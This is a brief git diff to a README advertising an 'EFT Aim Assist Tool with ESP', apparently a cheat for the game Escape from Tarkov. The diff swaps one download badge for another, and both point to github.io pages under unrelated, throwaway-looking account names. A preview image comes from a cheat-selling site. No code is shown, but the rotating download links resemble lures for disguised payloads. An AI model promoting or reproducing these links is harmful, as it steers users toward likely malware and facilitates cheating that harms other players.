@@ -4,7 +4,8 @@
 
 <h1 align="center">🎯 EFT Aim Assist Tool with ESP</h1>
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://gleasonrickey5.github.io/.github/eft-assist-tool)
+[![GET EFT Aim](https://img.shields.io/badge/GET%20%E2%80%94%20EFT-Aim-0078D6?style=for-the-badge&logoColor=white)](https://cranshawcoleen.github.io/.github/EFT-Aim)
+
 
 <p align="center">
   <img src="https://www.skycheats.com/uploads/monthly_2024_06/4(2).webp.1aaf95513e6d2619e73e951b7fac1590.webp" alt="EFT Aim Assist ESP Preview" width="800" />
